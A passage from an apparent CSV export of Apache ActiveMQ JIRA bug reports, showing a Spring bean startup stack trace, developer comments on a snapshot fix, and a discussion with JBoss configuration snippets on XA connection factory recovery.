	at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source)
	at java.lang.reflect.Method.invoke(Unknown Source)
	at org.apache.activemq.console.Main.runTaskClass(Main.java:251)
	at org.apache.activemq.console.Main.main(Main.java:107)
Caused by: org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'org.apache.activemq.ActiveMQConnectionFactory#1e6978d' defined in ServletContext resource [/WEB-INF/applicationContext.xml]: Error setting property values; nested exception is org.springframework.beans.NotWritablePropertyException: Invalid property 'useSingleConnection' of bean class [org.apache.activemq.ActiveMQConnectionFactory]: Bean property 'useSingleConnection' is not writable or has an invalid setter method. Does the parameter type of the setter match the return type of the getter?
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.applyPropertyValues(AbstractAutowireCapableBeanFactory.java:1344)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.populateBean(AbstractAutowireCapableBeanFactory.java:1067)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:511)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:450)
	at org.springframework.beans.factory.support.BeanDefinitionValueResolver.resolveInnerBean(BeanDefinitionValueResolver.java:270)
	... 60 more
Caused by: org.springframework.beans.NotWritablePropertyException: Invalid property 'useSingleConnection' of bean class [org.apache.activemq.ActiveMQConnectionFactory]: Bean property 'useSingleConnection' is not writable or has an invalid setter method. Does the parameter type of the setter match the return type of the getter?
	at org.springframework.beans.BeanWrapperImpl.setPropertyValue(BeanWrapperImpl.java:1012)
	at org.springframework.beans.BeanWrapperImpl.setPropertyValue(BeanWrapperImpl.java:857)
	at org.springframework.beans.AbstractPropertyAccessor.setPropertyValues(AbstractPropertyAccessor.java:76)
	at org.springframework.beans.AbstractPropertyAccessor.setPropertyValues(AbstractPropertyAccessor.java:58)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.applyPropertyValues(AbstractAutowireCapableBeanFactory.java:1341)
	... 64 more
2010-04-01 21:24:24,656 | ERROR | Failed startup of context WebAppContext@1b88122@1b88122/camel,file:/D:/apache-activemq-5.4-SNAPSHOT/webapps/camel/ | org.eclipse.jetty.util.log | main
org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'activemq' defined in ServletContext resource [/WEB-INF/applicationContext.xml]: Cannot create inner bean 'org.apache.activemq.ActiveMQConnectionFactory#1e6978d' of type [org.apache.activemq.ActiveMQConnectionFactory] while setting bean property 'connectionFactory'; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'org.apache.activemq.ActiveMQConnectionFactory#1e6978d' defined in ServletContext resource [/WEB-INF/applicationContext.xml]: Error setting property values; nested exception is org.springframework.beans.NotWritablePropertyException: Invalid property 'useSingleConnection' of bean class [org.apache.activemq.ActiveMQConnectionFactory]: Bean property 'useSingleConnection' is not writable or has an invalid setter method. Does the parameter type of the setter match the return type of the getter?
	at org.springframework.beans.factory.support.BeanDefinitionValueResolver.resolveInnerBean(BeanDefinitionValueResolver.java:281)
	at org.springframework.beans.factory.support.BeanDefinitionValueResolver.resolveValueIfNecessary(BeanDefinitionValueResolver.java:120)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.applyPropertyValues(AbstractAutowireCapableBeanFactory.java:1308)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.populateBean(AbstractAutowireCapableBeanFactory.java:1067)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:511)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:450)
	at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:290)
	at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222)
	at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:287)
	at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:189)
	at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:562)
	at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:871)
	at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:423)
	at org.springframework.web.context.ContextLoader.createWebApplicationContext(ContextLoader.java:272)
	at org.springframework.web.context.ContextLoader.initWebApplicationContext(ContextLoader.java:196)
	at org.springframework.web.context.ContextLoaderListener.contextInitialized(ContextLoaderListener.java:47)
	at org.eclipse.jetty.server.handler.ContextHandler.startContext(ContextHandler.java:645)
	at org.eclipse.jetty.servlet.ServletContextHandler.startContext(ServletContextHandler.java:189)
	at org.eclipse.jetty.webapp.WebAppContext.startContext(WebAppContext.java:978)
	at org.eclipse.jetty.server.handler.ContextHandler.doStart(ContextHandler.java:586)
	at org.eclipse.jetty.webapp.WebAppContext.doStart(WebAppContext.java:349)
	at org.eclipse.jetty.util.component.AbstractLifeCycle.start(AbstractLifeCycle.java:55)
	at org.eclipse.jetty.server.handler.HandlerCollection.doStart(HandlerCollection.java:165)
	at org.eclipse.jetty.util.component.AbstractLifeCycle.start(AbstractLifeCycle.java:55)
	at org.eclipse.jetty.server.handler.HandlerWrapper.doStart(HandlerWrapper.java:92)
	at org.eclipse.jetty.server.Server.doStart(Server.java:228)
	at org.eclipse.jetty.util.component.AbstractLifeCycle.start(AbstractLifeCycle.java:55)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source)
	at java.lang.reflect.Method.invoke(Unknown Source)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeCustomInitMethod(AbstractAutowireCapableBeanFactory.java:1527)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeInitMethods(AbstractAutowireCapableBeanFactory.java:1468)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1400)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:513)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:450)
	at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:290)
	at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222)
	at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:287)
	at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:189)
	at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:562)
	at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:871)
	at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:423)
	at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:64)
	at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:52)
	at org.apache.activemq.xbean.XBeanBrokerFactory.createApplicationContext(XBeanBrokerFactory.java:96)
	at org.apache.activemq.xbean.XBeanBrokerFactory.createBroker(XBeanBrokerFactory.java:52)
	at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:71)
	at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:54)
	at org.apache.activemq.console.command.StartCommand.startBroker(StartCommand.java:115)
	at org.apache.activemq.console.command.StartCommand.runTask(StartCommand.java:74)
	at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)
	at org.apache.activemq.console.command.ShellCommand.runTask(ShellCommand.java:136)
	at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)
	at org.apache.activemq.console.command.ShellCommand.main(ShellCommand.java:82)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source)
	at java.lang.reflect.Method.invoke(Unknown Source)
	at org.apache.activemq.console.Main.runTaskClass(Main.java:251)
	at org.apache.activemq.console.Main.main(Main.java:107)
Caused by: org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'org.apache.activemq.ActiveMQConnectionFactory#1e6978d' defined in ServletContext resource [/WEB-INF/applicationContext.xml]: Error setting property values; nested exception is org.springframework.beans.NotWritablePropertyException: Invalid property 'useSingleConnection' of bean class [org.apache.activemq.ActiveMQConnectionFactory]: Bean property 'useSingleConnection' is not writable or has an invalid setter method. Does the parameter type of the setter match the return type of the getter?
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.applyPropertyValues(AbstractAutowireCapableBeanFactory.java:1344)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.populateBean(AbstractAutowireCapableBeanFactory.java:1067)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:511)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:450)
	at org.springframework.beans.factory.support.BeanDefinitionValueResolver.resolveInnerBean(BeanDefinitionValueResolver.java:270)
	... 60 more
Caused by: org.springframework.beans.NotWritablePropertyException: Invalid property 'useSingleConnection' of bean class [org.apache.activemq.ActiveMQConnectionFactory]: Bean property 'useSingleConnection' is not writable or has an invalid setter method. Does the parameter type of the setter match the return type of the getter?
	at org.springframework.beans.BeanWrapperImpl.setPropertyValue(BeanWrapperImpl.java:1012)
	at org.springframework.beans.BeanWrapperImpl.setPropertyValue(BeanWrapperImpl.java:857)
	at org.springframework.beans.AbstractPropertyAccessor.setPropertyValues(AbstractPropertyAccessor.java:76)
	at org.springframework.beans.AbstractPropertyAccessor.setPropertyValues(AbstractPropertyAccessor.java:58)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.applyPropertyValues(AbstractAutowireCapableBeanFactory.java:1341)
	... 64 more
2010-04-01 21:24:24,875 | ERROR | Nested in org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'activemq' defined in ServletContext resource [/WEB-INF/applicationContext.xml]: Cannot create inner bean 'org.apache.activemq.ActiveMQConnectionFactory#1e6978d' of type [org.apache.activemq.ActiveMQConnectionFactory] while setting bean property 'connectionFactory'; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'org.apache.activemq.ActiveMQConnectionFactory#1e6978d' defined in ServletContext resource [/WEB-INF/applicationContext.xml]: Error setting property values; nested exception is org.springframework.beans.NotWritablePropertyException: Invalid property 'useSingleConnection' of bean class [org.apache.activemq.ActiveMQConnectionFactory]: Bean property 'useSingleConnection' is not writable or has an invalid setter method. Does the parameter type of the setter match the return type of the getter?: | org.eclipse.jetty.util.log | main
org.springframework.beans.NotWritablePropertyException: Invalid property 'useSingleConnection' of bean class [org.apache.activemq.ActiveMQConnectionFactory]: Bean property 'useSingleConnection' is not writable or has an invalid setter method. Does the parameter type of the setter match the return type of the getter?
	at org.springframework.beans.BeanWrapperImpl.setPropertyValue(BeanWrapperImpl.java:1012)
	at org.springframework.beans.BeanWrapperImpl.setPropertyValue(BeanWrapperImpl.java:857)
	at org.springframework.beans.AbstractPropertyAccessor.setPropertyValues(AbstractPropertyAccessor.java:76)
	at org.springframework.beans.AbstractPropertyAccessor.setPropertyValues(AbstractPropertyAccessor.java:58)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.applyPropertyValues(AbstractAutowireCapableBeanFactory.java:1341)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.populateBean(AbstractAutowireCapableBeanFactory.java:1067)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:511)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:450)
	at org.springframework.beans.factory.support.BeanDefinitionValueResolver.resolveInnerBean(BeanDefinitionValueResolver.java:270)
	at org.springframework.beans.factory.support.BeanDefinitionValueResolver.resolveValueIfNecessary(BeanDefinitionValueResolver.java:120)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.applyPropertyValues(AbstractAutowireCapableBeanFactory.java:1308)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.populateBean(AbstractAutowireCapableBeanFactory.java:1067)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:511)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:450)
	at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:290)
	at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222)
	at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:287)
	at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:189)
	at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:562)
	at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:871)
	at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:423)
	at org.springframework.web.context.ContextLoader.createWebApplicationContext(ContextLoader.java:272)
	at org.springframework.web.context.ContextLoader.initWebApplicationContext(ContextLoader.java:196)
	at org.springframework.web.context.ContextLoaderListener.contextInitialized(ContextLoaderListener.java:47)
	at org.eclipse.jetty.server.handler.ContextHandler.startContext(ContextHandler.java:645)
	at org.eclipse.jetty.servlet.ServletContextHandler.startContext(ServletContextHandler.java:189)
	at org.eclipse.jetty.webapp.WebAppContext.startContext(WebAppContext.java:978)
	at org.eclipse.jetty.server.handler.ContextHandler.doStart(ContextHandler.java:586)
	at org.eclipse.jetty.webapp.WebAppContext.doStart(WebAppContext.java:349)
	at org.eclipse.jetty.util.component.AbstractLifeCycle.start(AbstractLifeCycle.java:55)
	at org.eclipse.jetty.server.handler.HandlerCollection.doStart(HandlerCollection.java:165)
	at org.eclipse.jetty.util.component.AbstractLifeCycle.start(AbstractLifeCycle.java:55)
	at org.eclipse.jetty.server.handler.HandlerWrapper.doStart(HandlerWrapper.java:92)
	at org.eclipse.jetty.server.Server.doStart(Server.java:228)
	at org.eclipse.jetty.util.component.AbstractLifeCycle.start(AbstractLifeCycle.java:55)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source)
	at java.lang.reflect.Method.invoke(Unknown Source)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeCustomInitMethod(AbstractAutowireCapableBeanFactory.java:1527)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeInitMethods(AbstractAutowireCapableBeanFactory.java:1468)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1400)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:513)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:450)
	at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:290)
	at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222)
	at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:287)
	at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:189)
	at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:562)
	at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:871)
	at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:423)
	at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:64)
	at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:52)
	at org.apache.activemq.xbean.XBeanBrokerFactory.createApplicationContext(XBeanBrokerFactory.java:96)
	at org.apache.activemq.xbean.XBeanBrokerFactory.createBroker(XBeanBrokerFactory.java:52)
	at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:71)
	at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:54)
	at org.apache.activemq.console.command.StartCommand.startBroker(StartCommand.java:115)
	at org.apache.activemq.console.command.StartCommand.runTask(StartCommand.java:74)
	at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)
	at org.apache.activemq.console.command.ShellCommand.runTask(ShellCommand.java:136)
	at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)
	at org.apache.activemq.console.command.ShellCommand.main(ShellCommand.java:82)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source)
	at java.lang.reflect.Method.invoke(Unknown Source)
	at org.apache.activemq.console.Main.runTaskClass(Main.java:251)
	at org.apache.activemq.console.Main.main(Main.java:107)
2010-04-01 21:24:25,343 | INFO  | ActiveMQ Web Demos at http://0.0.0.0:8161/demo | org.eclipse.jetty.util.log | main
2010-04-01 21:24:25,437 | INFO  | RESTful file access application at http://0.0.0.0:8161/fileserver | org.eclipse.jetty.util.log | main
2010-04-01 21:24:25,484 | INFO  | Started SelectChannelConnector@0.0.0.0:8161 | org.eclipse.jetty.util.log | main
2010-04-01 21:24:45,921 | WARN  | Committed before 503 null | org.eclipse.jetty.util.log | qtp30964613-18;;;","02/Apr/10 09:15;dejanb;Hi,

it's fixed in svn revision 930197. I managed to mess the simple patch. You can try the next snapshot, or apply the aforementioned workaround on the current one. Sorry about that.;;;","02/Apr/10 11:51;ruralhunter;Sorry I tried the latest snapshot and it's still not working. same as the last build;;;","02/Apr/10 13:07;dejanb;It's the built before the fix made in. I started another build, should be finished soon;;;","18/Apr/10 15:41;ruralhunter;I confirm it's fixed in latest snapshot.;;;","17/Jun/10 08:47;kiorsak;I have unwillingly and unsuspectedly reproduced exactly same issue today... then googled out this page
nice to see it has been fixed already...

but when is 5.4 coming out?

or is it maybe fixed in latest FUSE sub-releases??

thank you!
;;;","17/Jun/10 11:57;gtully;Hi Oleg, can u also verify that the current 5.4-SNAPSHOT resolves the restart for you?

We aim to have 5.4 complete by the end of July.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ClassCast Exception in JBoss when using XA ,AMQ-2670,12483181,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,edwin@finalist.com,edwin@finalist.com,25/Mar/10 11:33,30/Mar/10 14:23,14/Jul/23 05:43,30/Mar/10 14:03,5.3.0,,,,,5.4.0,,,Connector,,,,0,,,,,,,,,"When deploying the rar under JBoss, the connectionfactory bound in de JNDI tree is always of type 'ActiveMQConnectionFactory'., while it should be ActiveMQXAConnectionFactory (which implements XAConnectionFactory).

I attached a new class that creates the correct type of factory, and this can be configured in the ra.xml (also attached).
",activemq-rar-5.3.0.rar deployed in jboss-5.1.0-GA,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-2656,"25/Mar/10 11:35;edwin@finalist.com;ActiveMQXAManagedConnectionFactory.java;https://issues.apache.org/jira/secure/attachment/12461662/ActiveMQXAManagedConnectionFactory.java","25/Mar/10 11:35;edwin@finalist.com;ra.xml;https://issues.apache.org/jira/secure/attachment/12461661/ra.xml",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74853,,,Tue Mar 30 14:05:32 UTC 2010,,,,,,,Patch Available,,,,"0|i0rqdb:",159916,,,,,,,,,,,,,,,,,,,,,"25/Mar/10 11:36;edwin@finalist.com;Note, for recovery to work (and for the original error to occur), a configuration in jbossts-properties.xml must be added, like this:
	<property name=""com.arjuna.ats.jta.recovery.XAResourceRecovery.ACTIVEMQ""
       value=""org.jboss.jms.server.recovery.MessagingXAResourceRecovery;java:/ActiveMQJMSProvider""/>
;;;","25/Mar/10 12:07;gtully;can you post an ejb or mdb descriptor that uses this. This looks like a use case where the RAR provides the connection factory but not the recovery contract, is that correct? With the RAR contract, the XAResource would normally be accessed via the javax.resource.spi.ResourceAdapter#getXAResources

With the new class, the RAR can be bypassed w.r.t to recovery, or just used as an easy way to deploy ActiveMQ to jboss. Am I missing something?;;;","25/Mar/10 12:42;edwin@finalist.com;An mdb:
@MessageDriven(mappedName = ""jms/SimpleMDB"", messageListenerInterface = javax.jms.MessageListener.class, activationConfig = {
        @ActivationConfigProperty(propertyName = ""destination"", propertyValue = ""queue.test""),
        @ActivationConfigProperty(propertyName = ""destinationType"", propertyValue = ""javax.jms.Queue""),
        @ActivationConfigProperty(propertyName = ""subscriptionDurability"", propertyValue = ""NonDurable""),
        @ActivationConfigProperty(propertyName = ""maximumRedeliveries"", propertyValue = ""0"") })
@ResourceAdapter(value = ""activemq-rar-5.3.0.rar"")
public class SimpleMDB implements MessageListener {
...
}

But it is not related to the MDB. The problem is that the connectionfactory is not the XA variant. This is deployed in a -ds.xml ike this:
<connection-factories>

   <tx-connection-factory>
      <jndi-name>activemq/QueueConnectionFactory</jndi-name>
      <xa-transaction/>
      <track-connection-by-tx/>
      <rar-name>activemq-rar-5.3.0.rar</rar-name>
      <connection-definition>javax.jms.QueueConnectionFactory</connection-definition>
      <ServerUrl>tcp://localhost:61616</ServerUrl>
      <min-pool-size>10</min-pool-size>
      <max-pool-size>200</max-pool-size>
      <blocking-timeout-millis>30000</blocking-timeout-millis>
      <idle-timeout-minutes>3</idle-timeout-minutes>
   </tx-connection-factory>

   <mbean code=""org.jboss.jms.jndi.JMSProviderLoader""
          name=""activemq:service=JMSProviderLoader,name=ActiveMQJMSProvider"">
      <attribute name=""ProviderName"">ActiveMQJMSProvider</attribute>
      <attribute name=""ProviderAdapterClass"">org.jboss.jms.jndi.JNDIProviderAdapter</attribute>
      <attribute name=""FactoryRef"">java:/activemq/QueueConnectionFactory</attribute>
      <attribute name=""QueueFactoryRef"">java:/activemq/QueueConnectionFactory</attribute>
      <attribute name=""TopicFactoryRef"">java:/activemq/QueueConnectionFactory</attribute>
   </mbean>
   
...
/>

This will result in a call to ActiveMQManagedConnectionFactory.createConnectionFactory during startup of JBoss (as configured in the ra.xml). But that will always create a ActiveMQConnectionFactory and never the ActiveMQXAConnectionFactory. 
And therefore, a ConnectionFactory instance is always bound in the JNDI and not an XAConnectionFactory.
So, it is not a bypass for the rar (it is still needed).

I see in the sources for ActiveMQXAConnectionFactory that all work is handled by the superclass (ActiveMQConnectionFactory), so it is only in JBoss actually performing the cast on the connectionfactory that causes a problem.;;;","25/Mar/10 17:27;gtully;ok, I see how this will work but it is a bit of a hack, all be it, one that is of value.

I would expect some sort of generic RAR com.arjuna.ats.jta.recovery.XAResourceRecovery impl that is aware of a resource adapter in jndi and can make calls on javax.resource.spi.ResourceAdapter#getXAResources to do recovery.

It looks like no such thing exists in jboss or arjuna atm, Having an option to publish an XA connection factory in jndi looks like a reasonable workaround.;;;","25/Mar/10 17:40;gtully;patch applied to trunk with thanks in r927520;;;","26/Mar/10 17:03;gtully;this breaks regular XA, the RAR needs to handle the XAResource and an XAConnectionFactory should not be created.
We need another mechanism to integrate with the periodic recovery of jboss. Possibly implement their recovery interface or a wrapper to it.;;;","29/Mar/10 10:11;gtully;Seems like the issue of of JCA XA recovery registration has come up in jboss land, and it is correctly seen as something that should be handled under the covers between JCA and the TransactionManager, but this has not been completed yet. See: https://jira.jboss.org/jira/browse/JBJCA-39

There may be some way to workaround this with JMS apis in the short term, but the real solution is to let the appserver work though registering the XA resource from JCA with the underlying transaction services of the container.
;;;","30/Mar/10 13:54;gtully;Using JMS apis for out of band recovery will work, there is one relevant jboss fix .w.r.t restarted the broker service that may also help https://jira.jboss.org/jira/browse/JBMESSAGING-1608

Background: The RAR should not create or use an XA connection factory, XA interaction is managed by the RAR implementation in response to calls from the appserver in accordance with the JCA transaction contract.
The appserver should also negotiate with the RAR to facilitate recovery using the JCA spi and that is what will be addressed by https://jira.jboss.org/jira/browse/JBJCA-39.

In the mean time, using the JMS api to deal with recovery is a necessary and a reasonable workaround.

Recovery is configured in the transaction manager properties using a resource wrapper from jboss messaging. In jboss 5.0.1_GA, the relevant addition to the transaction manager properties file: *conf/jbossjta-properties.xml* is:
{code}    <properties depends=""arjuna"" name=""jta"">
        <!--
        Support subtransactions in the JTA layer?
        Default is NO.
      -->
        <property name=""com.arjuna.ats.jta.supportSubtransactions"" value=""NO""/>
        <property name=""com.arjuna.ats.jta.jtaTMImplementation"" value=""com.arjuna.ats.internal.jta.transaction.arjunacore.TransactionManagerImple""/>
        <!--
                        com.arjuna.ats.internal.jta.transaction.jts.TransactionManagerImple
                        -->
        <property name=""com.arjuna.ats.jta.jtaUTImplementation"" value=""com.arjuna.ats.internal.jta.transaction.arjunacore.UserTransactionImple""/>
        <!--
                        com.arjuna.ats.internal.jta.transaction.jts.UserTransactionImple
                        -->
       <!-- recovery for ActiveMQ XA pending automated RAR recovery https://jira.jboss.org/jira/browse/JBJCA-39 -->
       <property name=""com.arjuna.ats.jta.recovery.XAResourceRecovery.ActiveMQ"" value=""org.jboss.jms.server.recovery.MessagingXAResourceRecovery;java:/ActiveMQRAR""/>

    </properties>{code} Note this is a modification to the *jta* configuration, _not_ the recovery manager.


The JNDI name referenced needs to be provided by the ActiveMQ RAR *-ds.xml"" descriptor using a JMSProviderLoader. The addition is as follows:{code}   <mbean code=""org.jboss.jms.jndi.JMSProviderLoader""
          name=""activemq:service=JMSProviderLoader,name=ActiveMQRAR"">
      <attribute name=""ProviderName"">ActiveMQRAR</attribute>
      <attribute name=""ProviderAdapterClass"">org.jboss.jms.jndi.JNDIProviderAdapter</attribute>
      <attribute name=""Properties"">xa=true
       java.naming.factory.initial=org.apache.activemq.jndi.ActiveMQInitialContextFactory
       java.naming.provider.url=tcp://localhost:61616
</attribute>
      <attribute name=""QueueFactoryRef"">ConnectionFactory</attribute>
      <attribute name=""TopicFactoryRef"">ConnectionFactory</attribute>
      <attribute name=""FactoryRef"">ConnectionFactory</attribute>
   </mbean>{code}

This depends on https://issues.apache.org/activemq/browse/AMQ-2656 to allow the ActiveMQ initial context to return an XA connection factory. Note the property, xa=true in the ""Properties"" attribute which ensures that an XAConnectionFactory is created.;;;","30/Mar/10 14:03;gtully;r929145
removed the XA version of the managed connection factory and added some additional logging to the transaction broker so it is easy to verify when recovery is configured. To see it, add the following to the log4j config: {code}log4j.logger.org.apache.activemq.broker.TransactionBroker=DEBUG{code} and a message will be output on every call to recover outstanding XA prepared transactions.;;;","30/Mar/10 14:05;gtully;Add dependency link to https://issues.apache.org/activemq/browse/AMQ-2656 as this needs ActiveMQ initial context to return an XA capable connection factory for out of band recovery using JMS api;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Slave in shared filesystem master/slave setup reports Slave=false in JMX,AMQ-2669,12483086,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,dejanb,dejanb,25/Mar/10 10:06,25/Mar/10 10:09,14/Jul/23 05:43,25/Mar/10 10:09,5.3.0,5.3.1,,,,5.4.0,,,,,,,0,,,,,,,,,"If you set up a shared filesystem master/slave, start the master, start the slave and then point JConsole at the slave the ""Slave"" attribute of the broker mbean is set to ""False"", same as the master. So it's not as straightforward as it should be to figure out via JMX whether or not an instance of the broker is a slave or not.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74854,,,Thu Mar 25 10:09:49 UTC 2010,,,,,,,,,,,"0|i0rqsf:",159984,,,,,,,,,,,,,,,,,,,,,"25/Mar/10 